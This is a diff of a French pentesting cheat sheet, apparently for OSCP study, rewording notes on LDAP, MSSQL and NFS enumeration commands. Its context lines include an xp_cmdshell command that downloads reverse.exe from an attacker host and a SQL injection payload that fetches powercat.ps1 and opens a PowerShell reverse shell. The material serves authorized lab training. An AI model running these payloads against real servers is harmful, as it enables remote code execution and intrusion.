@@ -2016,17 +2016,17 @@ ldapsearch -LLL -x -H ldap://<IP_DC> -s base -b '' defaultNamingContext namingCo
 
 Lister le nom des comptes exposés à un utilisateur LDAP autorisé.
 
-<p class="oscp-command-note">LDAP authentifié : lister les attributs sAMAccountName des objets utilisateurs visibles.</p>
+<p class="oscp-command-note">LDAP authentifié : lire sAMAccountName des objets user accessibles ; le filtre peut aussi inclure des comptes ordinateurs AD.</p>
 
 ```bash
-ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(objectClass=user)' sAMAccountName
+ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(&(objectCategory=person)(objectClass=user))' sAMAccountName
 ```
 
 ### 1433: MSSQL
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
-<p class="oscp-command-note">Nmap MSSQL : relever la version et les informations NTLM ; les scripts empty-password et xp-cmdshell ne sont pas exécutés.</p>
+<p class="oscp-command-note">Nmap MSSQL : identifier le service SQL Server et les informations NTLM exposées sans exécuter de commande SQL.</p>
 
 ```bash
 nmap -sV -p 1433 --script ms-sql-info,ms-sql-ntlm-info 192.0.2.10
@@ -2036,7 +2036,7 @@ nmap -sV -p 1433 --script ms-sql-info 192.0.2.10
 
 ```
 
-<p class="oscp-command-note">MSSQL : vérifier l'authentification et, avec les droits requis, exécuter une commande système via NetExec.</p>
+<p class="oscp-command-note">NetExec MSSQL : vérifier les identifiants et demander whoami sur le serveur uniquement si les droits d'exécution le permettent.</p>
 
 ```bash
 # Avec NetExec MSSQL, -x demande l'exécution d'une commande système, pas d'une requête SQL
@@ -2047,7 +2047,7 @@ nxc mssql 192.0.2.10 -d exemple.local -u utilisateur -p 'MotDePasseTest' -x 'who
 
 ```
 
-<p class="oscp-command-note">MSSQL avec sqsh : ouvrir une session SQL avec un compte autorisé ; éviter de laisser un mot de passe en clair dans l'historique.</p>
+<p class="oscp-command-note">sqsh : client SQL Server en terminal ; -P expose le mot de passe dans la ligne de commande, préférer une saisie sécurisée.</p>
 
 ```bash
 # Se connecter à MSSQL avec sqsh sous Linux (client installé requis)
@@ -2058,7 +2058,7 @@ sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>
 
 ```
 
-<p class="oscp-command-note">MSSQL : exemple de configuration xp_cmdshell ; cette modification est sensible et exige des droits élevés.</p>
+<p class="oscp-command-note">SQL Server : activer xp_cmdshell modifie la configuration globale et nécessite des privilèges élevés ; rétablir la configuration initiale après le test.</p>
 
 ```sql
 -- Activer les options avancées et xp_cmdshell (modifie la configuration du serveur ; droits élevés requis)
@@ -2070,11 +2070,11 @@ EXEC SP_CONFIGURE 'xp_cmdshell', 1;
 RECONFIGURE;
 GO
 
--- Tester xp_cmdshell pour exécuter une commande système
+-- Vérifier l'exécution de commandes système via xp_cmdshell avec une action de lecture seule
 EXEC xp_cmdshell 'whoami';
 GO
 
--- Exemple d'exécution distante : à réserver au laboratoire autorisé
+-- Exemple de téléchargement distant : à réserver au laboratoire autorisé ; vérifier le fichier avant exécution
 EXEC xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://<attacker_ip>:<port>/reverse.exe -OutFile c:\\Users\\Public\\reverse.exe"';
 GO
 
@@ -2084,31 +2084,31 @@ GO
 ```
 
 ```sql
--- Exemple d'injection SQL permettant de tester l'exécution de commandes
+-- Charge SQL illustrative liée à xp_cmdshell : dépend du contexte d'injection et ne s'exécute pas comme une requête SQL autonome
 test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/powercat.ps1'');powercat -c <attacker_ip> -p <port> -e powershell"';--
 
 ```
 
 ```sql
--- Lister les bases de données
+-- SQL Server : lister les bases visibles pour le compte courant
 SELECT name FROM sys.databases;
                 
--- Lister les tables accessibles dans la base courante
+-- SQL Server : lister les tables et vues accessibles via INFORMATION_SCHEMA
 SELECT * FROM information_schema.tables;
 
--- Afficher les données d'une table
+-- SQL Server : lire les lignes d'une table autorisée (remplacer le nom de table)
 SELECT * FROM <table_name>;
 
--- Rechercher des données dans une table
+-- SQL Server : filtrer les lignes avec LIKE (adapter la colonne et le motif)
 SELECT * FROM <table_name> WHERE <column_name> LIKE '%<search_term>%';
 
--- Insérer une ligne dans la table
+-- SQL Server : insérer une ligne ; opération d'écriture à éviter hors laboratoire
 INSERT INTO <table_name> (<column1>, <column2>) VALUES ('<value1>', '<value2>');
 
--- Modifier une ligne dans la table
+-- SQL Server : modifier des lignes ; définir une condition WHERE précise avant exécution
 UPDATE <table_name> SET <column_name> = '<new_value>' WHERE <condition>;
 
--- Supprimer une ligne de la table
+-- SQL Server : supprimer des lignes ; opération destructive à réserver aux données de test
 DELETE FROM <table_name> WHERE <condition>;
 
 ```
@@ -2117,7 +2117,7 @@ DELETE FROM <table_name> WHERE <condition>;
 
 Vérifier le type d'authentification demandé par l'instance MSSQL.
 
-<p class="oscp-command-note">Impacket MSSQLClient : se connecter avec l'authentification Windows d'un compte de domaine autorisé.</p>
+<p class="oscp-command-note">Impacket mssqlclient : utiliser -windows-auth pour l'authentification intégrée Windows avec un compte de domaine.</p>
 
 ```bash
 impacket-mssqlclient '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>' -windows-auth
@@ -2125,14 +2125,14 @@ impacket-mssqlclient '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>' -window
 
 ### 2049: NFS
 
-<p class="oscp-command-note">Nmap NFS : interroger les exports, les fichiers accessibles et les statistiques NFS via les scripts NSE.</p>
+<p class="oscp-command-note">Nmap NFS : consulter les exports, listes de fichiers et statistiques accessibles via les scripts NSE NFS.</p>
 
 ```bash
 nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <IP_CIBLE>
 
 ```
 
-<p class="oscp-command-note">Lister les exports NFS.</p>
+<p class="oscp-command-note">NFS : interroger mountd pour les exports (-e) et montages déclarés (-a), si le serveur les expose.</p>
 
 ```bash
 # Afficher les partages NFS de la cible
@@ -2143,7 +2143,7 @@ showmount -a <IP_CIBLE>
 
 ```
 
-<p class="oscp-command-note">NFS : créer un point de montage local puis monter un export NFSv3 en lecture seule.</p>
+<p class="oscp-command-note">Linux NFS : monter un export autorisé en lecture seule avec sudo ; vers=3 force NFSv3 et peut échouer sur un serveur NFSv4 uniquement.</p>
 
 ```bash
 # Créer un répertoire local pour monter le partage NFS
